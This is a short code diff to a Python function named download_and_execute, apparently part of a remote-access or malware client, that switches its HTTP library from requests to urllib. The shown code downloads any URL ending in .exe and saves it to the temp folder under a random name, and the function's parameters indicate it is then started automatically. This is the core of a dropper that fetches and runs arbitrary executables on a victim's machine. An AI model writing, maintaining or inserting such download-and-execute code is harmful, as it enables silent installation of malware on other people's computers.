@@ -1,4 +1,4 @@
-from requests import get
+import urllib.request
 from tempfile import gettempdir
 from random import choices
 from string import ascii_lowercase, digits
@@ -19,7 +19,7 @@ def download_and_execute(client=None, auto_start=True, url=None):
     # Check if it's a valid exe link
     if url[-4:] == '.exe':
         try:
-            file = get(url).content  # Gets files data
+            file = urllib.request.urlopen(url).read()  # Gets files data
 
             # Save file to temp folder under a random name.
             path = gettempdir() + '\\' + ''.join(choices(ascii_lowercase + digits, k=6)) + '.exe'
